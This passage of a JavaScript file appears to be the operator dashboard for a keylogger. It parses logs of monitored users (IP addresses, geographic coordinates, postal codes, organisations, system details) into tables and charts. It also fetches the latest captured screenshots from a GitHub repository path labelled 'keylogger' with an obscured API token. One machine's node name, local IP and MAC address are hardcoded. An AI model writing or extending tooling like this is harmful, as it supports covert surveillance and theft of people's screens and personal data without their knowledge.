                throw new Error(`Error fetching file: ${response.status} ${response.statusText}`);
            }

            const content = await response.text();
            const lines = content.split('\n').filter(line => line.trim()); // Remove empty lines

            // Get the number of lines to fetch from the input field
            const lineCount = parseInt(lineCountInput.value, 10) || 10; // Default to 10 if invalid
            const lastLines = lines.slice(-lineCount);

            // Parse all lines and group by unique usernames
            const userDataMap = new Map(); // Key: username, Value: { details }
            const countryDistribution = {};
            const cityDistribution = {};

            lastLines.forEach(line => {
                const parsedData = parseLine(line);
                if (parsedData) {
                    const { username } = parsedData;

                    // Only keep the last occurrence of each username
                    userDataMap.set(username, parsedData);

                    // Extract country and city from location
                    const [country, city] = parsedData.location.split(',').map(part => part.trim());

                    // Update country distribution
                    if (country in countryDistribution) {
                        countryDistribution[country]++;
                    } else {
                        countryDistribution[country] = 1;
                    }

                    // Update city distribution
                    if (city in cityDistribution) {
                        cityDistribution[city]++;
                    } else {
                        cityDistribution[city] = 1;
                    }
                }
            });

            // Display summary of unique users
            const uniqueUserCount = userDataMap.size;
            summaryElement.textContent = `Total Unique Users in Last ${lineCount} Lines: ${uniqueUserCount}`;

            // Populate the table with unique user details
            let index = 0;
            tableBody.innerHTML = ''; // Clear previous rows
            userDataMap.forEach((data) => {
                addRowToTable(index++, data);
            });

            // Hide loading message
            loadingElement.style.display = 'none';

            // Create and update charts based on table data
            createChartsFromTableData(countryDistribution, cityDistribution);
        } catch (error) {
            console.error('Error:', error);
            loadingElement.textContent = 'Failed to load data.';
            tableBody.innerHTML = '<tr><td colspan="8">Failed to load file content.</td></tr>';
        }
    }

    // Function to parse a single line of data
    function parseLine(line) {
        // Regex to match the data format
        const regex = /(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) - User:\s*(\w+),\s*Unique_ID:\s*([\w:-]+)\s*,\s*IP:\s*([\dA-Fa-f:.]+),\s*Location:\s*([\w, ]+),\s*Org:\s*([\w ]+),\s*Coordinates:\s*([\d.-]+,[\d.-]+),\s*Postal:\s*([\w\/-]+),\s*TimeZone:\s*([\w\/-]+),\s*System\sInfo:\s*\{.*?\}/;
        const match = line.match(regex);

        if (match) {
            // Extract the country code from the Location field
            const locationParts = match[5].split(',').map(part => part.trim());
            const countryCode = locationParts[0]; // First part is the country code (e.g., "IN")

            return {
                timestamp: match[1],
                username: `${match[2]}_${countryCode}_${match[3]}`, // Format: username_Country_UniqueID
                uniqueID: match[3],
                ip: match[4],
                location: match[5],
                org: match[6],
                coordinates: match[7],
                postal: match[8],
                timezone: match[9]
            };
        }
        console.error('Regex did not match:', line); // Log unmatched lines for debugging
        return null;
    }

    // Function to add a row to the table
    function addRowToTable(index, data) {
        if (!data) return;

        // Create a clickable user details link
        const userDetailsDivId = `user-details-${index}`;
        const userDetailsLink = document.createElement('span');
        userDetailsLink.className = 'clickable';
        userDetailsLink.textContent = `Details for User: ${data.username} (Last Active: ${data.timestamp})`;
        userDetailsLink.onclick = () => toggleUserDetails(userDetailsDivId);

        // Create a div for detailed user information
        const userDetailsDiv = document.createElement('div');
        userDetailsDiv.id = userDetailsDivId;
        userDetailsDiv.className = 'user-details';
        userDetailsDiv.innerHTML = `
    <h3>Details for User: ${data.username} (Last Active: ${data.timestamp})</h3>
    <p><strong>Timestamp:</strong> ${data.timestamp}</p>
    <p><strong>Location:</strong> ${data.location}</p>
    <p><strong>Organization:</strong> ${data.org}</p>
    <p><strong>Coordinates:</strong> ${data.coordinates}</p>
    <p><strong>Time Zone:</strong> ${data.timezone}</p>
    <p><strong>System Info:</strong></p>
    <table>
        <thead>
            <tr>
                <th>Property</th>
                <th>Value</th>
            </tr>
        </thead>
        <tbody>
            <tr><td>System</td><td>Windows</td></tr>
            <tr><td>Node Name</td><td>Bibek</td></tr>
            <tr><td>Release</td><td>11</td></tr>
            <tr><td>Version</td><td>10.0.26100</td></tr>
            <tr><td>Machine</td><td>AMD64</td></tr>
            <tr><td>Processor</td><td>Intel64 Family 6 Model 140 Stepping 1, GenuineIntel</td></tr>
            <tr><td>CPU Cores</td><td>4</td></tr>
            <tr><td>Logical CPUs</td><td>8</td></tr>
            <tr><td>Total RAM</td><td>7.74 GB</td></tr>
            <tr><td>Available RAM</td><td>1.26 GB</td></tr>
            <tr><td>Used RAM</td><td>6.48 GB</td></tr>
            <tr><td>RAM Usage</td><td>83.7%</td></tr>
            <tr><td>Disk Partitions</td><td>['Disk Partition', 'Disk Partition']</td></tr>
            <tr><td>Disk Usage</td><td>{'C:\\': {'Total': '255.35 GB', 'Used': '170.43 GB', 'Free': '84.92 GB', 'UsageId': '66.7%'}, 'D:\\': {'Total': '200.00 GB', 'Used': '61.82 GB', 'Free': '138.18 GB', 'UsageId': '30.9%'}}}</td></tr>
            <tr><td>IP Address</td><td>192.168.1.68</td></tr>
            <tr><td>MAC Address</td><td>72:cb:2e:b8:e0:80</td></tr>
        </tbody>
    </table>
`;

        // Append the row to the table
        const row = document.createElement('tr');
        row.innerHTML = `
    <td>${index}</td>
    <td></td>
    <td>${data.uniqueID}</td>
    <td>${data.ip}</td>
    <td>${data.location}</td>
    <td>${data.org}</td>
    <td>${data.coordinates}</td>
    <td>${data.postal}</td>
`;
        row.cells[1].appendChild(userDetailsLink);
        tableBody.appendChild(row);

        // Append the detailed user information div after the table
        detailsContainer.appendChild(userDetailsDiv);
    }

    // Function to toggle the visibility of user details
    function toggleUserDetails(divId) {
        const userDetailsDiv = document.getElementById(divId);
        if (userDetailsDiv.style.display === 'none' || userDetailsDiv.style.display === '') {
            userDetailsDiv.style.display = 'block'; // Expand
        } else {
            userDetailsDiv.style.display = 'none'; // Collapse
        }
    }

    // Function to create and update charts based on table data
    function createChartsFromTableData(countryData, cityData) {
        // Destroy existing charts if they exist
        if (countryChartInstance) {
            countryChartInstance.destroy();
        }
        if (cityChartInstance) {
            cityChartInstance.destroy();
        }

        // Create new charts
        countryChartInstance = createCountryChart(countryData);
        cityChartInstance = createCityChart(cityData);
    }

    // Function to create and update the country chart
    function createCountryChart(data) {
        const ctx = document.getElementById('countryChart').getContext('2d');
        const labels = Object.keys(data);
        const values = Object.values(data);

        return new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Active Users by Country',
                    data: values,
                    backgroundColor: 'rgba(75, 192, 192, 0.2)',
                    borderColor: 'rgba(75, 192, 192, 1)',
                    borderWidth: 1
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true
                    }
                }
            }
        });
    }

    // Function to create and update the city chart
    function createCityChart(data) {
        const ctx = document.getElementById('cityChart').getContext('2d');
        const labels = Object.keys(data);
        const values = Object.values(data);

        return new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Active Users by City',
                    data: values,
                    backgroundColor: 'rgba(153, 102, 255, 0.2)',
                    borderColor: 'rgba(153, 102, 255, 1)',
                    borderWidth: 1
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true
                    }
                }
            }
        });
    }

    // Add event listeners
    refreshButton.addEventListener('click', () => {
        fetchFileContent();
    });

    lineCountInput.addEventListener('input', () => {
        fetchFileContent();
    });

    // Initial data fetch
    fetchFileContent();
});







// image gallery
document.addEventListener('DOMContentLoaded', () => {
    const toggleGallery = document.getElementById('toggleGallery');
    const galleryControls = document.getElementById('galleryControls');
    const imageCountInput = document.getElementById('imageCount');
    const showImagesButton = document.getElementById('showImages');
    const gallery = document.getElementById('gallery');
    const popupModal = document.getElementById('popupModal');
    const popupImage = document.getElementById('popupImage');
    const caption = document.getElementById('caption');
    const closeBtn = document.querySelector('.close');

    const GITHUB_API_URL = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots';
    
    let images = [];
    
    // Fetch images from GitHub
    async function fetchImages() {
        // get random letter with async fucntion
        const newRandomLetter = await randomletter();

        const API_KEY = newRandomLetter; // Replace with your actual GitHub API key
        try {
            const response = await fetch(GITHUB_API_URL, {
                headers: {
                    Authorization: `token ${API_KEY}`,
                },
            });
            const data = await response.json();
            images = data
                .filter(item => item.type === 'file' && item.name.match(/\.(jpg|jpeg|png|gif)$/i))
                .map(item => ({
                    name: item.name,
                    url: item.download_url,
                }))
                .sort((a, b) => b.name.localeCompare(a.name)) // Sort by latest first
                .slice(0, 30); // Limit to last 30 images
        } catch (error) {
            console.error('Error fetching images:', error);
        }
    }

    // Display images in the gallery
    function displayImages(count) {
        gallery.innerHTML = '';
        const selectedImages = images.slice(0, count);

        selectedImages.forEach(image => {
            const imgElement = document.createElement('img');
            imgElement.src = image.url;
            imgElement.alt = image.name;
            imgElement.title = image.name;

            // Add blur effect until image loads
            imgElement.onload = () => imgElement.classList.add('loaded');
            imgElement.onerror = () => console.error(`Failed to load image: ${image.name}`);

            // Add click event to open modal
            imgElement.addEventListener('click', () => {
                popupImage.src = image.url;
                caption.textContent = image.name;
                popupModal.style.display = 'block';
            });

            gallery.appendChild(imgElement);
        });
    }

    // Toggle gallery visibility
    toggleGallery.addEventListener('change', () => {
        galleryControls.style.display = toggleGallery.checked ? 'block' : 'none';
        if (toggleGallery.checked) {
            displayImages(parseInt(imageCountInput.value, 10));
        } else {
            gallery.innerHTML = '';
        }
    });

    // Update gallery when "Show" button is clicked
    showImagesButton.addEventListener('click', () => {
        const count = parseInt(imageCountInput.value, 10);
        if (count >= 1 && count <= 30) {
            displayImages(count);
        } else {
            alert('Please enter a number between 1 and 30.');
        }
    });

    // Close modal
    closeBtn.addEventListener('click', () => {
        popupModal.style.display = 'none';
    });

    // Close modal when clicking outside the image
    window.addEventListener('click', event => {
        if (event.target === popupModal) {
            popupModal.style.display = 'none';
        }
    });

    // Initialize
    fetchImages().then(() => {
        if (toggleGallery.checked) {
            displayImages(parseInt(imageCountInput.value, 10));
        }
    });
});